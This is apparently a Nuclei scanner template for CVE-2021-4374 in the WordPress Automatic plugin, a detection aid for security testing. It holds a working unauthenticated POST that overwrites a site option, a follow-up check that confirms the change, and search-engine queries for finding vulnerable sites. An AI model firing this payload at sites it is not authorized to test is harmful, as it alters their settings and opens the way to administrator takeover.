id: CVE-2021-4374

info:
  name: "WordPress Automatic Plugin - Unauthenticated Options Change"
  author: intelligent-ears
  severity: critical
  description: |
    WordPress Automatic Plugin (versions 3.53.2 and below) contains a critical vulnerability that allows unauthenticated users to change arbitrary WordPress options through the process_form.php script. The vulnerable script uses update_option() on all POST parameters without authentication or capability checks, allowing attackers to create administrator accounts or modify critical settings. The vulnerability can be exploited even if the plugin is deactivated as it's a standalone script.
  reference:
    - "https://www.wordfence.com/blog/2021/09/critical-vulnerability-fixed-in-wordpress-automatic-plugin/"
    - "https://nvd.nist.gov/vuln/detail/CVE-2021-4374"
  classification:
    cve-id: "CVE-2021-4374"
    cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    cvss-score: 9.8
    cwe-id: "CWE-862"
  metadata:
    fofa-query: "wp-content/plugins/wp-automatic/"
    google-query: inurl:"/wp-content/plugins/wp-automatic/"
    shodan-query: 'http.html:"wp-content/plugins/wp-automatic/"'
    verified: true
    max-request: 2
    vendor: "ValvePress"
    product: "WordPress Automatic Plugin"
    publicdisclosure: "2021-09-06"
  tags: cve,cve2021,wordpress,wp-plugin,unauth,critical

requests:
  - raw:
      - |
        POST /wp-content/plugins/wp-automatic/process_form.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        field1=nuclei_test_{{randstr}}&field3=test&field4=test&field5=test&field6=test&blogdescription=nuclei_cve_2021_4374_{{randstr}}

      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    cookie-reuse: true

    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - 'nuclei_cve_2021_4374_{{randstr}}'

      - type: status
        status:
          - 200
